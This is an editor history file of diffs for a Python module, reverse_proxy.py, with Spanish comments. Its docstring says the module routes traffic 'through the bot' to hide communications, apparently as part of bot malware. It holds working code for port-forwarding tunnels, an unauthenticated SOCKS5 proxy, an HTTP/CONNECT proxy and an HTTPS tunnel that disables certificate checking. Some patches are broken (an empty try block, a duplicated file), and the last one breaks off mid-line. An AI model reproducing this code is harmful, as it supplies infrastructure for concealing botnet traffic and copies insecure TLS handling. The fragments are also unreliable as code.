{
    "sourceFile": "src/modules/reverse_proxy.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 4,
            "patches": [
                {
                    "date": 1740263542004,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740264073793,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,13 @@\n import logging\r\n import sys\r\n import queue\r\n import time\r\n-from typing import Dict, Set, Optional, Tuple\r\n+from typing import Dict, Set, Optional, Tuple, List\r\n+import ssl\r\n+import base64\r\n+import http.client\r\n+from urllib.parse import urlparse\r\n \r\n class ReverseProxy:\r\n     def __init__(self, local_host: str = \"127.0.0.1\", local_port: int = 8080):\r\n         \"\"\"\r\n@@ -50,12 +54,8 @@\n             return False\r\n \r\n     def remove_route(self, local_port: int) -> bool:\r\n         \"\"\"\r\n-        Elimina una ruta de redirección.\r\n-        \r\n-        Args:\r\n-            local_port: Puerto local de la ruta a eliminar\r\n             \r\n         Returns:\r\n             bool indicando si se eliminó la ruta\r\n         \"\"\"\r\n"
                },
                {
                    "date": 1740264089413,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,205 @@\n+\"\"\"\r\n+Módulo de proxy reverso.\r\n+Permite redirigir tráfico a través del bot para ocultar la comunicación.\r\n+\"\"\"\r\n+\r\n+import socket\r\n+import threading\r\n+import select\r\n+import logging\r\n+import sys\r\n+import queue\r\n+import time\r\n+from typing import Dict, Set, Optional, Tuple, List\r\n+import ssl\r\n+import base64\r\n+import http.client\r\n+from urllib.parse import urlparse\r\n+\r\n+class ReverseProxy:\r\n+    def __init__(self, local_host: str = \"127.0.0.1\", local_port: int = 8080):\r\n+        \"\"\"\r\n+        Inicializa el proxy reverso.\r\n+        \r\n+        Args:\r\n+            local_host: Host local donde escuchar\r\n+            local_port: Puerto local donde escuchar\r\n+        \"\"\"\r\n+        self.local_host = local_host\r\n+        self.local_port = local_port\r\n+        self.running = False\r\n+        self.connections: Dict[socket.socket, socket.socket] = {}\r\n+        self.routes: Dict[Tuple[str, int], Tuple[str, int]] = {}\r\n+        self.lock = threading.Lock()\r\n+        self.bufsize = 4096\r\n+        self.active_tunnels: Set[Tuple[str, int]] = set()\r\n+\r\n+    def add_route(self, local_port: int, remote_host: str, remote_port: int) -> bool:\r\n+        \"\"\"\r\n+        Añade una nueva ruta de redirección.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local a escuchar\r\n+            remote_host: Host remoto destino\r\n+            remote_port: Puerto remoto destino\r\n+            \r\n+        Returns:\r\n+            bool indicando si se añadió la ruta correctamente\r\n+        \"\"\"\r\n+        try:\r\n+            self.routes[(self.local_host, local_port)] = (remote_host, remote_port)\r\n+            return True\r\n+        except Exception as e:\r\n+            logging.error(f\"Error añadiendo ruta: {e}\")\r\n+            return False\r\n+\r\n+    def remove_route(self, local_port: int) -> bool:\r\n+        \"\"\"\r\n+        Elimina una ruta de redirección.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local de la ruta a eliminar\r\n+            \r\n+        Returns:\r\n+            bool indicando si se eliminó la ruta\r\n+        \"\"\"\r\n+        try:\r\n+            del self.routes[(self.local_host, local_port)]\r\n+            return True\r\n+        except KeyError:\r\n+            return False\r\n+\r\n+    def start(self) -> bool:\r\n+        \"\"\"\r\n+        Inicia el proxy reverso.\r\n+        \r\n+        Returns:\r\n+            bool indicando si se inició correctamente\r\n+        \"\"\"\r\n+        if self.running:\r\n+            return False\r\n+\r\n+        self.running = True\r\n+        \r\n+        for local_endpoint in self.routes.keys():\r\n+            try:\r\n+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+                server.bind(local_endpoint)\r\n+                server.listen(5)\r\n+                \r\n+                thread = threading.Thread(\r\n+                    target=self._handle_incoming,\r\n+                    args=(server, self.routes[local_endpoint]),\r\n+                    daemon=True\r\n+                )\r\n+                thread.start()\r\n+                \r\n+                logging.info(f\"Proxy escuchando en {local_endpoint}\")\r\n+                \r\n+            except Exception as e:\r\n+                logging.error(f\"Error iniciando proxy en {local_endpoint}: {e}\")\r\n+                self.running = False\r\n+                return False\r\n+\r\n+        return True\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el proxy reverso.\"\"\"\r\n+        self.running = False\r\n+        with self.lock:\r\n+            for local_sock, remote_sock in self.connections.items():\r\n+                try:\r\n+                    local_sock.close()\r\n+                    remote_sock.close()\r\n+                except:\r\n+                    pass\r\n+            self.connections.clear()\r\n+            self.active_tunnels.clear()\r\n+\r\n+    def _handle_incoming(self, server: socket.socket, remote_endpoint: Tuple[str, int]):\r\n+        \"\"\"Maneja conexiones entrantes.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                local_socket, addr = server.accept()\r\n+                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                remote_socket.connect(remote_endpoint)\r\n+                \r\n+                with self.lock:\r\n+                    self.connections[local_socket] = remote_socket\r\n+                    self.active_tunnels.add(remote_endpoint)\r\n+                \r\n+                threading.Thread(\r\n+                    target=self._handle_tunnel,\r\n+                    args=(local_socket, remote_socket),\r\n+                    daemon=True\r\n+                ).start()\r\n+                \r\n+                logging.info(f\"Nuevo túnel: {addr} -> {remote_endpoint}\")\r\n+                \r\n+            except Exception as e:\r\n+                logging.error(f\"Error en conexión entrante: {e}\")\r\n+                continue\r\n+\r\n+    def _handle_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n+        \"\"\"Maneja un túnel individual entre cliente y servidor.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                readable, _, exceptional = select.select(\r\n+                    [local_socket, remote_socket],\r\n+                    [],\r\n+                    [local_socket, remote_socket],\r\n+                    1.0\r\n+                )\r\n+                \r\n+                if exceptional:\r\n+                    break\r\n+                    \r\n+                for sock in readable:\r\n+                    other = remote_socket if sock is local_socket else local_socket\r\n+                    data = sock.recv(self.bufsize)\r\n+                    \r\n+                    if not data:\r\n+                        return\r\n+                        \r\n+                    other.send(data)\r\n+                    \r\n+            except Exception as e:\r\n+                logging.error(f\"Error en túnel: {e}\")\r\n+                break\r\n+                \r\n+        self._cleanup_tunnel(local_socket, remote_socket)\r\n+\r\n+    def _cleanup_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n+        \"\"\"Limpia las conexiones cuando un túnel se cierra.\"\"\"\r\n+        with self.lock:\r\n+            if local_socket in self.connections:\r\n+                remote_endpoint = remote_socket.getpeername()\r\n+                del self.connections[local_socket]\r\n+                self.active_tunnels.discard(remote_endpoint)\r\n+                \r\n+        try:\r\n+\r\n+    def get_active_tunnels(self) -> Set[Tuple[str, int]]:\r\n+        \"\"\"\r\n+        Obtiene los túneles activos.\r\n+        \r\n+        Returns:\r\n+            Set con las tuplas (host, puerto) de los túneles activos\r\n+        \"\"\"\r\n+        with self.lock:\r\n+            return self.active_tunnels.copy()\r\n+\r\n+    def get_statistics(self) -> Dict[str, int]:\r\n+        \"\"\"\r\n+        Obtiene estadísticas del proxy.\r\n+        \r\n+        Returns:\r\n+            Dict con estadísticas básicas\r\n+        \"\"\"\r\n+        with self.lock:\r\n+            return {\r\n+                \"active_connections\": len(self.connections),\r\n+                \"active_tunnels\": len(self.active_tunnels),\r\n+                \"configured_routes\": len(self.routes)\r\n+            }\r\n"
                },
                {
                    "date": 1740264098944,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -178,8 +178,12 @@\n                 del self.connections[local_socket]\r\n                 self.active_tunnels.discard(remote_endpoint)\r\n                 \r\n         try:\r\n+            local_socket.close()\r\n+            remote_socket.close()\r\n+        except:\r\n+            pass\r\n \r\n     def get_active_tunnels(self) -> Set[Tuple[str, int]]:\r\n         \"\"\"\r\n         Obtiene los túneles activos.\r\n@@ -202,209 +206,66 @@\n                 \"active_connections\": len(self.connections),\r\n                 \"active_tunnels\": len(self.active_tunnels),\r\n                 \"configured_routes\": len(self.routes)\r\n             }\r\n-\"\"\"\r\n-Módulo de proxy reverso.\r\n-Permite redirigir tráfico a través del bot para ocultar la comunicación.\r\n-\"\"\"\r\n \r\n-import socket\r\n-import threading\r\n-import select\r\n-import logging\r\n-import sys\r\n-import queue\r\n-import time\r\n-from typing import Dict, Set, Optional, Tuple, List\r\n-import ssl\r\n-import base64\r\n-import http.client\r\n-from urllib.parse import urlparse\r\n-\r\n-class ReverseProxy:\r\n-    def __init__(self, local_host: str = \"127.0.0.1\", local_port: int = 8080):\r\n+    def create_https_tunnel(self, local_port: int, remote_host: str, remote_port: int = 443) -> bool:\r\n         \"\"\"\r\n-        Inicializa el proxy reverso.\r\n+        Crea un túnel HTTPS.\r\n         \r\n         Args:\r\n-            local_host: Host local donde escuchar\r\n-            local_port: Puerto local donde escuchar\r\n-        \"\"\"\r\n-        self.local_host = local_host\r\n-        self.local_port = local_port\r\n-        self.running = False\r\n-        self.connections: Dict[socket.socket, socket.socket] = {}\r\n-        self.routes: Dict[Tuple[str, int], Tuple[str, int]] = {}\r\n-        self.lock = threading.Lock()\r\n-        self.bufsize = 4096\r\n-        self.active_tunnels: Set[Tuple[str, int]] = set()\r\n-\r\n-    def add_route(self, local_port: int, remote_host: str, remote_port: int) -> bool:\r\n-        \"\"\"\r\n-        Añade una nueva ruta de redirección.\r\n-        \r\n-        Args:\r\n-            local_port: Puerto local a escuchar\r\n-            remote_host: Host remoto destino\r\n-            remote_port: Puerto remoto destino\r\n+            local_port: Puerto local para el túnel\r\n+            remote_host: Host remoto\r\n+            remote_port: Puerto remoto (443 por defecto)\r\n             \r\n         Returns:\r\n-            bool indicando si se añadió la ruta correctamente\r\n+            bool indicando si se creó el túnel\r\n         \"\"\"\r\n         try:\r\n+            # Configurar contexto SSL\r\n+            context = ssl.create_default_context()\r\n+            context.check_hostname = False\r\n+            context.verify_mode = ssl.CERT_NONE\r\n+            \r\n+            def handle_https_tunnel(local_socket: socket.socket, addr: Tuple[str, int]):\r\n+                try:\r\n+                    # Conectar al servidor remoto usando SSL\r\n+                    remote_socket = context.wrap_socket(\r\n+                        socket.socket(socket.AF_INET, socket.SOCK_STREAM),\r\n+                        server_hostname=remote_host\r\n+                    )\r\n+                    remote_socket.connect((remote_host, remote_port))\r\n+                    \r\n+                    # Manejar el túnel\r\n+                    self._handle_tunnel(local_socket, remote_socket)\r\n+                    \r\n+                except Exception as e:\r\n+                    logging.error(f\"Error en túnel HTTPS: {e}\")\r\n+                finally:\r\n+                    self._cleanup_tunnel(local_socket, remote_socket)\r\n+            \r\n+            # Crear socket de escucha\r\n+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+            server.bind((self.local_host, local_port))\r\n+            server.listen(5)\r\n+            \r\n+            # Agregar la ruta\r\n             self.routes[(self.local_host, local_port)] = (remote_host, remote_port)\r\n+            \r\n+            # Iniciar thread para aceptar conexiones\r\n+            threading.Thread(\r\n+                target=lambda: self._accept_https_connections(server, handle_https_tunnel),\r\n+                daemon=True\r\n+            ).start()\r\n+            \r\n             return True\r\n+            \r\n         except Exception as e:\r\n-            logging.error(f\"Error añadiendo ruta: {e}\")\r\n+            logging.error(f\"Error creando túnel HTTPS: {e}\")\r\n             return False\r\n \r\n-    def remove_route(self, local_port: int) -> bool:\r\n-        \"\"\"\r\n-            \r\n-        Returns:\r\n-            bool indicando si se eliminó la ruta\r\n-        \"\"\"\r\n-        try:\r\n-            del self.routes[(self.local_host, local_port)]\r\n-            return True\r\n-        except KeyError:\r\n-            return False\r\n-\r\n-    def start(self) -> bool:\r\n-        \"\"\"\r\n-        Inicia el proxy reverso.\r\n-        \r\n-        Returns:\r\n-            bool indicando si se inició correctamente\r\n-        \"\"\"\r\n-        if self.running:\r\n-            return False\r\n-\r\n-        self.running = True\r\n-        \r\n-        for local_endpoint in self.routes.keys():\r\n-            try:\r\n-                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n-                server.bind(local_endpoint)\r\n-                server.listen(5)\r\n-                \r\n-                thread = threading.Thread(\r\n-                    target=self._handle_incoming,\r\n-                    args=(server, self.routes[local_endpoint]),\r\n-                    daemon=True\r\n-                )\r\n-                thread.start()\r\n-                \r\n-                logging.info(f\"Proxy escuchando en {local_endpoint}\")\r\n-                \r\n-            except Exception as e:\r\n-                logging.error(f\"Error iniciando proxy en {local_endpoint}: {e}\")\r\n-                self.running = False\r\n-                return False\r\n-\r\n-        return True\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el proxy reverso.\"\"\"\r\n-        self.running = False\r\n-        with self.lock:\r\n-            for local_sock, remote_sock in self.connections.items():\r\n-                try:\r\n-                    local_sock.close()\r\n-                    remote_sock.close()\r\n-                except:\r\n-                    pass\r\n-            self.connections.clear()\r\n-            self.active_tunnels.clear()\r\n-\r\n-    def _handle_incoming(self, server: socket.socket, remote_endpoint: Tuple[str, int]):\r\n-        \"\"\"Maneja conexiones entrantes.\"\"\"\r\n+    def _accept_https_connections(self, server: socket.socket, handler):\r\n+        \"\"\"Acepta conexiones para el túnel HTTPS.\"\"\"\r\n         while self.running:\r\n             try:\r\n-                local_socket, addr = server.accept()\r\n-                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-                remote_socket.connect(remote_endpoint)\r\n-                \r\n-                with self.lock:\r\n-                    self.connections[local_socket] = remote_socket\r\n-                    self.active_tunnels.add(remote_endpoint)\r\n-                \r\n-                threading.Thread(\r\n-                    target=self._handle_tunnel,\r\n-                    args=(local_socket, remote_socket),\r\n-                    daemon=True\r\n-                ).start()\r\n-                \r\n-                logging.info(f\"Nuevo túnel: {addr} -> {remote_endpoint}\")\r\n-                \r\n-            except Exception as e:\r\n-                logging.error(f\"Error en conexión entrante: {e}\")\r\n-                continue\r\n-\r\n-    def _handle_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n-        \"\"\"Maneja un túnel individual entre cliente y servidor.\"\"\"\r\n-        while self.running:\r\n-            try:\r\n-                readable, _, exceptional = select.select(\r\n-                    [local_socket, remote_socket],\r\n-                    [],\r\n-                    [local_socket, remote_socket],\r\n-                    1.0\r\n-                )\r\n-                \r\n-                if exceptional:\r\n-                    break\r\n-                    \r\n-                for sock in readable:\r\n-                    other = remote_socket if sock is local_socket else local_socket\r\n-                    data = sock.recv(self.bufsize)\r\n-                    \r\n-                    if not data:\r\n-                        return\r\n-                        \r\n-                    other.send(data)\r\n-                    \r\n-            except Exception as e:\r\n-                logging.error(f\"Error en túnel: {e}\")\r\n-                break\r\n-                \r\n-        self._cleanup_tunnel(local_socket, remote_socket)\r\n-\r\n-    def _cleanup_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n-        \"\"\"Limpia las conexiones cuando un túnel se cierra.\"\"\"\r\n-        with self.lock:\r\n-            if local_socket in self.connections:\r\n-                remote_endpoint = remote_socket.getpeername()\r\n-                del self.connections[local_socket]\r\n-                self.active_tunnels.discard(remote_endpoint)\r\n-                \r\n-        try:\r\n-            local_socket.close()\r\n-            remote_socket.close()\r\n-        except:\r\n-            pass\r\n-\r\n-    def get_active_tunnels(self) -> Set[Tuple[str, int]]:\r\n-        \"\"\"\r\n-        Obtiene los túneles activos.\r\n-        \r\n-        Returns:\r\n-            Set con las tuplas (host, puerto) de los túneles activos\r\n-        \"\"\"\r\n-        with self.lock:\r\n-            return self.active_tunnels.copy()\r\n-\r\n-    def get_statistics(self) -> Dict[str, int]:\r\n-        \"\"\"\r\n-        Obtiene estadísticas del proxy.\r\n-        \r\n-        Returns:\r\n-            Dict con estadísticas básicas\r\n-        \"\"\"\r\n-        with self.lock:\r\n-            return {\r\n-                \"active_connections\": len(self.connections),\r\n-                \"active_tunnels\": len(self.active_tunnels),\r\n-                \"configured_routes\": len(self.routes)\r\n-            }\r\n+                client_socket, addr = server.accept()\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740264123332,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,483 @@\n+\"\"\"\r\n+Módulo de proxy reverso.\r\n+Permite redirigir tráfico a través del bot para ocultar la comunicación.\r\n+\"\"\"\r\n+\r\n+import socket\r\n+import threading\r\n+import select\r\n+import logging\r\n+import sys\r\n+import queue\r\n+import time\r\n+from typing import Dict, Set, Optional, Tuple, List\r\n+import ssl\r\n+import base64\r\n+import http.client\r\n+from urllib.parse import urlparse\r\n+\r\n+class ReverseProxy:\r\n+    def __init__(self, local_host: str = \"127.0.0.1\", local_port: int = 8080):\r\n+        \"\"\"\r\n+        Inicializa el proxy reverso.\r\n+        \r\n+        Args:\r\n+            local_host: Host local donde escuchar\r\n+            local_port: Puerto local donde escuchar\r\n+        \"\"\"\r\n+        self.local_host = local_host\r\n+        self.local_port = local_port\r\n+        self.running = False\r\n+        self.connections: Dict[socket.socket, socket.socket] = {}\r\n+        self.routes: Dict[Tuple[str, int], Tuple[str, int]] = {}\r\n+        self.lock = threading.Lock()\r\n+        self.bufsize = 4096\r\n+        self.active_tunnels: Set[Tuple[str, int]] = set()\r\n+\r\n+    def add_route(self, local_port: int, remote_host: str, remote_port: int) -> bool:\r\n+        \"\"\"\r\n+        Añade una nueva ruta de redirección.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local a escuchar\r\n+            remote_host: Host remoto destino\r\n+            remote_port: Puerto remoto destino\r\n+            \r\n+        Returns:\r\n+            bool indicando si se añadió la ruta correctamente\r\n+        \"\"\"\r\n+        try:\r\n+            self.routes[(self.local_host, local_port)] = (remote_host, remote_port)\r\n+            return True\r\n+        except Exception as e:\r\n+            logging.error(f\"Error añadiendo ruta: {e}\")\r\n+            return False\r\n+\r\n+    def remove_route(self, local_port: int) -> bool:\r\n+        \"\"\"\r\n+        Elimina una ruta de redirección.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local de la ruta a eliminar\r\n+            \r\n+        Returns:\r\n+            bool indicando si se eliminó la ruta\r\n+        \"\"\"\r\n+        try:\r\n+            del self.routes[(self.local_host, local_port)]\r\n+            return True\r\n+        except KeyError:\r\n+            return False\r\n+\r\n+    def start(self) -> bool:\r\n+        \"\"\"\r\n+        Inicia el proxy reverso.\r\n+        \r\n+        Returns:\r\n+            bool indicando si se inició correctamente\r\n+        \"\"\"\r\n+        if self.running:\r\n+            return False\r\n+\r\n+        self.running = True\r\n+        \r\n+        for local_endpoint in self.routes.keys():\r\n+            try:\r\n+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+                server.bind(local_endpoint)\r\n+                server.listen(5)\r\n+                \r\n+                thread = threading.Thread(\r\n+                    target=self._handle_incoming,\r\n+                    args=(server, self.routes[local_endpoint]),\r\n+                    daemon=True\r\n+                )\r\n+                thread.start()\r\n+                \r\n+                logging.info(f\"Proxy escuchando en {local_endpoint}\")\r\n+                \r\n+            except Exception as e:\r\n+                logging.error(f\"Error iniciando proxy en {local_endpoint}: {e}\")\r\n+                self.running = False\r\n+                return False\r\n+\r\n+        return True\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el proxy reverso.\"\"\"\r\n+        self.running = False\r\n+        with self.lock:\r\n+            for local_sock, remote_sock in self.connections.items():\r\n+                try:\r\n+                    local_sock.close()\r\n+                    remote_sock.close()\r\n+                except:\r\n+                    pass\r\n+            self.connections.clear()\r\n+            self.active_tunnels.clear()\r\n+\r\n+    def _handle_incoming(self, server: socket.socket, remote_endpoint: Tuple[str, int]):\r\n+        \"\"\"Maneja conexiones entrantes.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                local_socket, addr = server.accept()\r\n+                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                remote_socket.connect(remote_endpoint)\r\n+                \r\n+                with self.lock:\r\n+                    self.connections[local_socket] = remote_socket\r\n+                    self.active_tunnels.add(remote_endpoint)\r\n+                \r\n+                threading.Thread(\r\n+                    target=self._handle_tunnel,\r\n+                    args=(local_socket, remote_socket),\r\n+                    daemon=True\r\n+                ).start()\r\n+                \r\n+                logging.info(f\"Nuevo túnel: {addr} -> {remote_endpoint}\")\r\n+                \r\n+            except Exception as e:\r\n+                logging.error(f\"Error en conexión entrante: {e}\")\r\n+                continue\r\n+\r\n+    def _handle_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n+        \"\"\"Maneja un túnel individual entre cliente y servidor.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                readable, _, exceptional = select.select(\r\n+                    [local_socket, remote_socket],\r\n+                    [],\r\n+                    [local_socket, remote_socket],\r\n+                    1.0\r\n+                )\r\n+                \r\n+                if exceptional:\r\n+                    break\r\n+                    \r\n+                for sock in readable:\r\n+                    other = remote_socket if sock is local_socket else local_socket\r\n+                    data = sock.recv(self.bufsize)\r\n+                    \r\n+                    if not data:\r\n+                        return\r\n+                        \r\n+                    other.send(data)\r\n+                    \r\n+            except Exception as e:\r\n+                logging.error(f\"Error en túnel: {e}\")\r\n+                break\r\n+                \r\n+        self._cleanup_tunnel(local_socket, remote_socket)\r\n+\r\n+    def _cleanup_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n+        \"\"\"Limpia las conexiones cuando un túnel se cierra.\"\"\"\r\n+        with self.lock:\r\n+            if local_socket in self.connections:\r\n+                remote_endpoint = remote_socket.getpeername()\r\n+                del self.connections[local_socket]\r\n+                self.active_tunnels.discard(remote_endpoint)\r\n+                \r\n+        try:\r\n+            local_socket.close()\r\n+            remote_socket.close()\r\n+        except:\r\n+            pass\r\n+\r\n+    def get_active_tunnels(self) -> Set[Tuple[str, int]]:\r\n+        \"\"\"\r\n+        Obtiene los túneles activos.\r\n+        \r\n+        Returns:\r\n+            Set con las tuplas (host, puerto) de los túneles activos\r\n+        \"\"\"\r\n+        with self.lock:\r\n+            return self.active_tunnels.copy()\r\n+\r\n+    def get_statistics(self) -> Dict[str, int]:\r\n+        \"\"\"\r\n+        Obtiene estadísticas del proxy.\r\n+        \r\n+        Returns:\r\n+            Dict con estadísticas básicas\r\n+        \"\"\"\r\n+        with self.lock:\r\n+            return {\r\n+                \"active_connections\": len(self.connections),\r\n+                \"active_tunnels\": len(self.active_tunnels),\r\n+                \"configured_routes\": len(self.routes)\r\n+            }\r\n+\r\n+    def create_https_tunnel(self, local_port: int, remote_host: str, remote_port: int = 443) -> bool:\r\n+        \"\"\"\r\n+        Crea un túnel HTTPS.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local para el túnel\r\n+            remote_host: Host remoto\r\n+            remote_port: Puerto remoto (443 por defecto)\r\n+            \r\n+        Returns:\r\n+            bool indicando si se creó el túnel\r\n+        \"\"\"\r\n+        try:\r\n+            # Configurar contexto SSL\r\n+            context = ssl.create_default_context()\r\n+            context.check_hostname = False\r\n+            context.verify_mode = ssl.CERT_NONE\r\n+            \r\n+            def handle_https_tunnel(local_socket: socket.socket, addr: Tuple[str, int]):\r\n+                try:\r\n+                    # Conectar al servidor remoto usando SSL\r\n+                    remote_socket = context.wrap_socket(\r\n+                        socket.socket(socket.AF_INET, socket.SOCK_STREAM),\r\n+                        server_hostname=remote_host\r\n+                    )\r\n+                    remote_socket.connect((remote_host, remote_port))\r\n+                    \r\n+                    # Manejar el túnel\r\n+                    self._handle_tunnel(local_socket, remote_socket)\r\n+                    \r\n+                except Exception as e:\r\n+                    logging.error(f\"Error en túnel HTTPS: {e}\")\r\n+                finally:\r\n+                    self._cleanup_tunnel(local_socket, remote_socket)\r\n+            \r\n+            # Crear socket de escucha\r\n+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+            server.bind((self.local_host, local_port))\r\n+            server.listen(5)\r\n+            \r\n+            # Agregar la ruta\r\n+            self.routes[(self.local_host, local_port)] = (remote_host, remote_port)\r\n+            \r\n+            # Iniciar thread para aceptar conexiones\r\n+            threading.Thread(\r\n+                target=lambda: self._accept_https_connections(server, handle_https_tunnel),\r\n+                daemon=True\r\n+            ).start()\r\n+            \r\n+            return True\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error creando túnel HTTPS: {e}\")\r\n+            return False\r\n+\r\n+    def _accept_https_connections(self, server: socket.socket, handler):\r\n+        \"\"\"Acepta conexiones para el túnel HTTPS.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                client_socket, addr = server.accept()\r\n+                threading.Thread(target=handler, args=(client_socket, addr)).start()\r\n+            except Exception as e:\r\n+                if self.running:\r\n+                    logging.error(f\"Error aceptando conexión HTTPS: {e}\")\r\n+\r\n+    def create_socks_proxy(self, local_port: int) -> bool:\r\n+        \"\"\"\r\n+        Crea un proxy SOCKS5.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local para el proxy\r\n+            \r\n+        Returns:\r\n+            bool indicando si se creó el proxy\r\n+        \"\"\"\r\n+        try:\r\n+            def handle_socks_client(client: socket.socket):\r\n+                try:\r\n+                    # Autenticación SOCKS5\r\n+                    version = client.recv(1)\r\n+                    if version != b'\\x05':\r\n+                        return\r\n+                        \r\n+                    nmethods = client.recv(1)[0]\r\n+                    methods = client.recv(nmethods)\r\n+                    \r\n+                    # Responder sin autenticación\r\n+                    client.send(b'\\x05\\x00')\r\n+                    \r\n+                    # Recibir petición\r\n+                    version = client.recv(1)\r\n+                    if version != b'\\x05':\r\n+                        return\r\n+                        \r\n+                    cmd = client.recv(1)[0]\r\n+                    _ = client.recv(1)  # Reserved\r\n+                    atyp = client.recv(1)[0]\r\n+                    \r\n+                    if cmd != 1:  # Solo soportamos CONNECT\r\n+                        client.send(b'\\x05\\x07\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')\r\n+                        return\r\n+                        \r\n+                    # Obtener dirección destino\r\n+                    if atyp == 1:  # IPv4\r\n+                        addr = socket.inet_ntoa(client.recv(4))\r\n+                        port = int.from_bytes(client.recv(2), 'big')\r\n+                    elif atyp == 3:  # Domain\r\n+                        length = client.recv(1)[0]\r\n+                        addr = client.recv(length).decode()\r\n+                        port = int.from_bytes(client.recv(2), 'big')\r\n+                    else:\r\n+                        client.send(b'\\x05\\x08\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')\r\n+                        return\r\n+                        \r\n+                    # Conectar al destino\r\n+                    try:\r\n+                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                        remote.connect((addr, port))\r\n+                        bind_addr = remote.getsockname()\r\n+                        \r\n+                        # Responder éxito\r\n+                        response = b'\\x05\\x00\\x00\\x01'\r\n+                        response += socket.inet_aton(bind_addr[0])\r\n+                        response += bind_addr[1].to_bytes(2, 'big')\r\n+                        client.send(response)\r\n+                        \r\n+                    except:\r\n+                        client.send(b'\\x05\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')\r\n+                        return\r\n+                        \r\n+                    # Manejar el túnel\r\n+                    self._handle_tunnel(client, remote)\r\n+                    \r\n+                except Exception as e:\r\n+                    logging.error(f\"Error en cliente SOCKS: {e}\")\r\n+                finally:\r\n+                    try:\r\n+                        client.close()\r\n+                    except:\r\n+                        pass\r\n+            \r\n+            # Crear socket SOCKS\r\n+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+            server.bind((self.local_host, local_port))\r\n+            server.listen(5)\r\n+            \r\n+            # Agregar la ruta\r\n+            self.routes[(self.local_host, local_port)] = (\"SOCKS5\", 0)\r\n+            \r\n+            # Iniciar thread para aceptar conexiones\r\n+            threading.Thread(\r\n+                target=lambda: self._accept_socks_connections(server, handle_socks_client),\r\n+                daemon=True\r\n+            ).start()\r\n+            \r\n+            return True\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error creando proxy SOCKS: {e}\")\r\n+            return False\r\n+\r\n+    def _accept_socks_connections(self, server: socket.socket, handler):\r\n+        \"\"\"Acepta conexiones para el proxy SOCKS.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                client_socket, _ = server.accept()\r\n+                threading.Thread(target=handler, args=(client_socket,)).start()\r\n+            except Exception as e:\r\n+                if self.running:\r\n+                    logging.error(f\"Error aceptando conexión SOCKS: {e}\")\r\n+\r\n+    def create_http_proxy(self, local_port: int) -> bool:\r\n+        \"\"\"\r\n+        Crea un proxy HTTP.\r\n+        \r\n+        Args:\r\n+            local_port: Puerto local para el proxy\r\n+            \r\n+        Returns:\r\n+            bool indicando si se creó el proxy\r\n+        \"\"\"\r\n+        try:\r\n+            def handle_http_client(client: socket.socket):\r\n+                try:\r\n+                    # Recibir petición HTTP\r\n+                    data = client.recv(8192)\r\n+                    first_line = data.split(b'\\n')[0]\r\n+                    method, url, _ = first_line.split(b' ')\r\n+                    \r\n+                    # Parsear URL\r\n+                    url = url.decode()\r\n+                    parsed = urlparse(url)\r\n+                    port = parsed.port or (443 if parsed.scheme == 'https' else 80)\r\n+                    \r\n+                    if method == b'CONNECT':\r\n+                        # Petición HTTPS\r\n+                        hostname = parsed.path\r\n+                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+                        remote.connect((hostname, port))\r\n+                        client.send(b'HTTP/1.1 200 Connection established\\r\\n\\r\\n')\r\n+                        self._handle_tunnel(client, remote)\r\n+                    else:\r\n+                        # Petición HTTP\r\n+                        conn = http.client.HTTPConnection(parsed.hostname, port)\r\n+                        path = parsed.path or '/'\r\n+                        if parsed.query:\r\n+                            path += '?' + 